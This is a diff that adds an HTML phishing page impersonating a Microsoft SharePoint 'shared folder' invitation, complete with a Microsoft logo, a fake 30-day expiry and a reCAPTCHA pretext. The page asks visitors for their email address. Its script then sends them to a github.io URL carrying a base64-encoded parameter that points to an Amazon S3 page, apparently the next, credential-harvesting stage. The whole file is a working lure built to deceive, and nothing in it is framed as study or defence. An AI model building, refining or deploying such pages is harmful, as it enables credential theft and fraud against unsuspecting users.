@@ -1,1 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share Invitation — Microsoft SharePoint</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+  <script src="https://www.google.com/recaptcha/api.js?render=explicit&onload=onRecaptchaLoad" async defer></script>
+  <style>
+    :root {
+      --bg1: #f6f8ff;
+      --bg2: #eef6ff;
+      --card: #ffffff;
+      --muted: #6b7280;
+      --accent1: #5b21b6;
+      --accent2: #7c3aed;
+      --glass: rgba(255,255,255,0.65);
+      --radius: 14px;
+      --shadow: 0 10px 30px rgba(16,24,40,0.08);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'Open Sans', system-ui, -apple-system, 'Segoe UI', Roboto, Arial;
+      background: radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.12), transparent),
+                  radial-gradient(1000px 500px at 90% 90%, rgba(59,130,246,0.06), transparent),
+                  linear-gradient(180deg, var(--bg1), var(--bg2));
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .stage {
+      position: relative;
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 420px;
+      gap: 48px;
+      align-items: center;
+    }
+
+    .hero {
+      padding: 48px 40px;
+      border-radius: var(--radius);
+      background: linear-gradient(180deg, rgba(255,255,255,0.6), rgba(255,255,255,0.45));
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(6px);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .hero:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 20px 40px rgba(16,24,40,0.12);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 32px;
+    }
+
+    .brand img {
+      width: 64px;
+      height: 64px;
+      transition: transform 0.3s ease;
+    }
+
+    .brand:hover img {
+      transform: scale(1.05);
+    }
+
+    .brand h1 {
+      margin: 0;
+      font-size: 20px;
+      letter-spacing: -0.2px;
+      font-weight: 700;
+    }
+
+    .brand p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 14px;
+      font-weight: 400;
+      font-style: italic;
+    }
+
+    .headline {
+      margin-top: 0;
+      margin-bottom: 16px;
+      font-size: 32px;
+      line-height: 1.25;
+      font-weight: 700;
+      color: #0f172a;
+    }
+
+    .sub {
+      color: var(--muted);
+      font-size: 16px;
+      margin-bottom: 32px;
+      font-weight: 400;
+      line-height: 1.5;
+    }
+
+    .illustration {
+      height: 220px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(180deg, rgba(124,58,237,0.06), rgba(99,102,241,0.02));
+      border: 1px solid rgba(99,102,241,0.06);
+      transition: all 0.3s ease;
+    }
+
+    .illustration:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 15px 30px rgba(99,102,241,0.08);
+    }
+
+    .illustration .card {
+      width: 86%;
+      height: 72%;
+      border-radius: 10px;
+      background: linear-gradient(180deg, #fff, #fbfcff);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 18px 50px rgba(12,13,28,0.06);
+      padding: 20px;
+      transition: all 0.3s ease;
+    }
+
+    .illustration:hover .card {
+      transform: scale(1.02);
+    }
+
+    .illustration .icon {
+      font-weight: 700;
+      color: var(--accent2);
+      font-size: 40px;
+      margin-bottom: 8px;
+    }
+
+    .illustration p {
+      margin: 0;
+      color: var(--muted);
+      font-weight: 400;
+      font-style: italic;
+    }
+
+    .card-form {
+      background: var(--card);
+      padding: 32px;
+      border-radius: 16px;
+      box-shadow: 0 18px 40px rgba(12,13,28,0.06);
+      min-height: 420px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      justify-content: flex-start;
+      transition: box-shadow 0.25s ease;
+    }
+
+    .card-form h2 {
+      margin: 0 0 8px 0;
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .lead {
+      color: var(--muted);
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+
+    .field {
+      margin-top: 12px;
+      position: relative;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 10px;
+      border: 1px solid rgba(15,23,42,0.06);
+      font-size: 15px;
+      outline: none;
+      background: linear-gradient(180deg, #fff, #fbfbff);
+      transition: all 0.3s ease;
+    }
+
+    .field input:focus {
+      box-shadow: 0 8px 30px rgba(99,102,241,0.08);
+      border-color: rgba(124,58,237,0.35);
+      transform: translateY(-2px);
+    }
+
+    .field input:hover {
+      border-color: rgba(124,58,237,0.2);
+    }
+
+    .label {
+      font-size: 14px;
+      color: var(--muted);
+      margin-bottom: 8px;
+      font-weight: 600;
+      display: block;
+    }
+
+    .cta {
+      margin-top: 20px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 16px;
+      border-radius: 12px;
+      border: 0;
+      font-weight: 700;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      background: linear-gradient(90deg, var(--accent1), var(--accent2));
+      box-shadow: 0 12px 30px rgba(124,58,237,0.18);
+      transform: translateZ(0);
+      transition: transform 0.18s ease, box-shadow 0.18s ease;
+    }
+
+    .btn:active {
+      transform: translateY(1px) scale(0.998);
+    }
+
+    .btn:hover {
+      box-shadow: 0 18px 40px rgba(124,58,237,0.22);
+      transform: translateY(-3px);
+    }
+
+    .toast {
+      position: fixed;
+      right: 24px;
+      bottom: 24px;
+      background: linear-gradient(90deg, #06b6d4, #0ea5e9);
+      color: white;
+      font-weight: 500;
+      padding: 12px 24px;
+      border-radius: 8px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="stage">
+      <div class="hero">
+        <div class="brand">
+          <img src="https://tse4.mm.bing.net/th/id/OIP.W5qWsWY_5jh4lODzUojjXgHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Microsoft Logo">
+          <p>         
+            <h1>Microsoft SharePoint</h1>
+            <p>Secure file sharing · OneDrive integration</p>
+        </div>
+		
+        <h2 class="headline">One of your contacts has shared a Folder with you</h2>
+        <p class="sub">Open the shared folder to view files, collaborate, and stay in sync. Secure access — expires in 30 days.</p>
+        <div class="illustration">
+          <div class="card">
+            <div class="icon">📁</div>
+            <p>Your Shared Folder • 24 items is ready to be accessed. </p>
+			            <p>Just input your email.!</p>
+          </div>
+        </div>
+      </div>
+      <div class="card-form">
+        <h2>Enter your email address</h2>
+        <p class="lead">Please confirm your email address below and pass the reCAPTCHA to proceed.</p>
+        <form id="inviteForm">
+          <div class="field">
+            <label for="email" class="label">Email Address</label>
+            <input type="email" id="email" name="email" required placeholder="you@example.com">
+          </div>
+        <div class="cta">
+          <button type="submit" class="btn" id="submitBtn">
+            <span id="btnText"> Access SharePoint Folder </span>
+            <span class="arrow">→</span>
+          </button>
+        </div>
+        </form>
+        <div class="help">
+          <div>Need help? <a href="#">Contact admin</a></div>
+          <div>Expires <strong>30d</strong></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast-container">
+    <div id="toast" class="toast">Processing Shared Folder </div>
+  </div>
+
+  <script>
+    function showToast() {
+      const toast = document.getElementById('toast');
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    document.getElementById('inviteForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      
+      const email = document.getElementById('email').value;
+      if (!validateEmail(email)) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+
+      // Simulate an API request (you can replace this with an actual API call)
+      setTimeout(() => {
+        // Show success message
+        showToast();
+        
+        // Redirect after form submission
+        window.location.href = 'https://bryanben300-bot.github.io/255363777?w=eyJ1IjoiaHR0cHM6Ly84ODc4MzY3MzMtMjc5NzIyMzIzMjQuczMudXMtZWFzdC0yLmFtYXpvbmF3cy5jb20vOTgyOTEyODM3ODk4MjEvNzk5OTg5Mi0yODk3ODk3ODIuaHRtbCIsInIiOiJkMjcyODZkMi1hOTllLTQxMjctOWQzNC00ODk3YmNkZWY5ZmYiLCJtIjoibHAiLCJ0IjoxNzYwNjE5NTg1NjYyfQ%3D%3D'; // Replace with the URL of the next page
+      }, 1000);
+
+      // Reset form
+      document.getElementById('inviteForm').reset();
+    });
+
+    function validateEmail(email) {
+      const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+      return regex.test(email);
+    }
+
+    function onRecaptchaLoad() {
+      // Initialize reCAPTCHA
+      grecaptcha.render('recaptcha-container', {
+        'sitekey': 'your-recaptcha-site-key', // Replace with your reCAPTCHA site key
+      });
+    }
+  </script>
+</body>
+</html>
+
 
